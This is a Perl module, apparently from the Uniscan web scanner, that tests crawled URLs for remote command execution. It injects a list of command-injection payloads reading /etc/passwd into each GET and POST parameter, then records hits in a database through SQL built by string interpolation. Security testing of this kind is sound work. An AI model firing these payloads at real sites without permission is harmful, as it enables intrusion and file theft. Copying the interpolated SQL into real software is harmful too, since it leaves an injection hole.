#!/usr/bin/perl -w

use Uniscan::Configure;
use Uniscan::Functions;
use Uniscan::Http;
use threads;
use threads::shared;
use Thread::Queue;
use Thread::Semaphore;

my $c = Uniscan::Configure->new(conffile => "uniscan.conf");
my $func = Uniscan::Functions->new();
my $http = Uniscan::Http->new();
my $q = new Thread::Queue;
my $semaphore = Thread::Semaphore->new();

our %conf = ( );
%conf = $c->loadconf();
$|++;

#metricas
our $requests : shared = 0;
our %testado : shared = ();
our $arqs : shared = 0;
our $vuls : shared = "";
our %vtestado : shared = ();
our $varst : shared = 0;
our %varvul : shared = ();
our $vvar : shared = 0;
our %arqvul : shared = ();
our $arqv : shared = 0;



our $report_id :shared= $ARGV[0];
my @urls = $func->pega_dados_crawler($report_id);




our @RCE = (
	'|cat /etc/passwd',
	'|cat /etc/passwd|',
	'|cat /etc/passwd%00|',
	'|cat /etc/passwd%00.html|',
	'|cat /etc/passwd%00.htm|',
	'|cat /etc/passwd%00.dat|',
	'|cat /etc/passwd%00.pdf|',
	'system("cat /etc/passwd");',
	'.system("cat /etc/passwd").',
	':system("cat /etc/passwd");',
	';system("cat /etc/passwd").',
	';system("cat /etc/passwd")',
	';system("cat /etc/passwd");',
	':system("cat /etc/passwd").',
	'`cat /etc/passwd`',
	'`cat /etc/passwd`;',
	';cat /etc/passwd;',
	'\x0a cat /etc/passwd;'
	);

	my $t = threads->new(\&online);
	&ScanRCECrawler(@urls);	
	&ScanRCECrawlerPost(@urls);
	$vuls =~s/'/\\'/gi;
	$func->insert("INSERT INTO vulnerabilidade(report_id, dados, arq_testados, arq_vuls, var_testadas, var_vuls, reqs, tipo_id) VALUES($report_id, '$vuls', $arqs, $arqv, $varst, $vvar, $requests, 21)");
	$func->insert("UPDATE historico SET rce = $vvar WHERE report_id= $report_id");
	        while($q->pending > 0){
	                $q->dequeue;
	        }
	$t->join();


sub ScanRCECrawler(){
	my @urls = @_;
	my @tests = &GenerateTests("RCE", @urls);
	@tests = $func->remove(@tests) if(scalar(@tests));
	&threadnize("TestRCE", @tests) if(scalar(@tests));
}

sub ScanRCECrawlerPost(){
	my @urls = @_;
	my @tests = &GenerateTestsPost("RCE", @urls);
	@tests = $func->remove(@tests) if(scalar(@tests));
	&threadnize("TestRCEPost", @tests) if(scalar(@tests));
}

sub TestRCE(){
	while($q->pending > 0){
		$semaphore->down();
		my $test = $q->dequeue;
		$semaphore->up();
		next if(not defined $test);
		next if($test =~/\|#\|/g);
		if(!$varvul{&gera_var_vul($test)}){
			my $resp = $http->GET($test);
			$requests++;
			&metrica_testados($test);
			if($resp =~/root:x:0:0:root/ || ($resp =~/boot loader/ && $resp =~/operating systems/ && $resp =~/WINDOWS/)){
				
				$vuls .= $test."\n";
				&metricas_vul($test);
			}
		}
		$resp = 0;
	}
	$q->enqueue(undef);
}


sub TestRCEPost(){
	while($q->pending > 0){
		$semaphore->down();
		my $test = $q->dequeue;
		$semaphore->up();
		next if(not defined $test);
		next if($test !~/\|#\|/g);
		if(!$varvul{&gera_var_vul($test)}){
			my ($url, $data) = split('\|#\|', $test);
			my $resp = $http->POST($url, $data);
			$requests++;
			&metrica_testados($url."|#|".$data);
			if($resp =~/root:x:0:0:root/ || ($resp =~/boot loader/ && $resp =~/operating systems/ && $resp =~/WINDOWS/)){
				$vuls .= $url."|#|".$data;
				&metricas_vul($url."|#|".$data);
			}
		}
		$resp = 0;
	}
	$q->enqueue(undef);
}

sub GenerateTests(){
	my ($test, @list) = @_;
	my @list2 = ();
	foreach my $line (@list){
		$line =~ s/&amp;/&/g;
		next if($line =~/\.asp/);
		$line =~ s/\[\]//g;
		if($line =~ /=/ && $line !~/\|#\|/){
			my $temp = $line;
			$temp = substr($temp,index($temp, '?')+1,length($temp));
			my @variables = split('&', $temp);
			for(my $x=0; $x< scalar(@variables); $x++){
				my $var_temp = substr($variables[$x],0,index($variables[$x], '=')+1);
				no strict 'refs';
				if($var_temp){
					foreach my $str (@{$test}){
						$temp = $line;
#						$str = urlencode($str) if($conf{'url_encode'} == 1);
						my $t = $var_temp . $str;
						$temp =~ s/\Q$variables[$x]\E//g;
						$temp .= '&' .$t;
						$temp =~s/\?&/\?/g;
						$temp =~s/&&/&/g;
						push(@list2, $temp);
					}
				}
			}
		@variables = ();
		}
	}
	@list = ();
	return @list2;
}

sub GenerateTestsPost(){
  	my ($test, @list) = @_;
  	my @list2 = ();
  	foreach my $line (@list){
		next if($line !~/\|#\|/);
		next if($line =~/\.asp/);
  		my ($url, $line) = split('\|#\|', $line);
  		$line =~ s/&amp;/&/g;
  		$line =~ s/\[\]//g;
  		if($line =~ /=/){
  			my $temp = $line;
  			$temp = substr($temp,index($temp, '?')+1,length($temp));
  			my @variables = split('&', $temp);
  			for(my $x=0; $x< scalar(@variables); $x++){
  				my $var_temp = substr($variables[$x],0,index($variables[$x], '=')+1);
  				no strict 'refs';
  				if($var_temp){
  					foreach my $str (@{$test}){
  						$temp = $line;
#  						$str = urlencode($str) if($conf{'url_encode'} == 1);
  						my $t = $var_temp . $str;
						$temp =~ s/\Q$variables[$x]\E//g;
						$temp .= '&' .$t;
						$temp =~s/\?&/\?/g;
						$temp =~s/&&/&/g;
  						push(@list2, $url . '|#|' .$temp);
  					}
  				}
  			}
  		}
  	}
  	@list = ();
  	return @list2;
 }




sub threadnize(){
	my ($fun, @tests) = @_;
	foreach my $test (@tests){
		$q->enqueue($test) if($test);
	}

	my $x=0;
	my @threads = ();
	while($q->pending() && $x <= $conf{'max_threads'}-1){
		no strict 'refs';
		push @threads, threads->new(\&{$fun});
		$x++;
	}

	
	foreach my $running (@threads) {
		$running->join();
	}
	@threads = ();
}


sub gera_var_vul(){
	my $url = shift;
	my $varl = substr($url, rindex($url, '&')+1, length($url));
	my ($var, $valor) = split('=', $varl);
	my $str = $func->get_file($url) . $var;
	return $str;
	
}

sub metricas_vul(){
	my $url = shift;
	if(!$arqvul{$func->get_file($url)}){
		$arqvul{$func->get_file($url)} = 1;
		$arqv++;
	}
	
	if(!$varvul{&gera_var_vul($url)}){
		$varvul{&gera_var_vul($url)} = 1;
		$vvar++;
	}
}

sub metrica_testados(){
	my $url = shift;
	if(!$testado{$func->get_file($url)}){
		$testado{$func->get_file($url)}=1;
		$arqs++;
	}
	if(!$vtestado{&gera_var_vul($url)}){
		$vtestado{&gera_var_vul($url)}=1;
		$varst++;
	}	
}


sub checa_online(){
        my $h = Uniscan::Http->new();
        my $x=0;
        my $site = $func->pega_site($report_id);
        while ($x<=10) {
                my $res = $h->GET1($site);
                if ($res->is_success) {
                        return 1;
                }
                else{
                        sleep(30);
                }
                $x++;
        }
        &grava_waf();
        return 0;
}

sub grava_waf(){
        $func->insert("UPDATE report SET waf=1 WHERE report_id=". $report_id);
}

sub online(){
        while(checa_online() && $q->pending > 0){
                sleep(10);
        }
	#exit();
        while($q->pending > 0){
                $q->dequeue;
        }
}

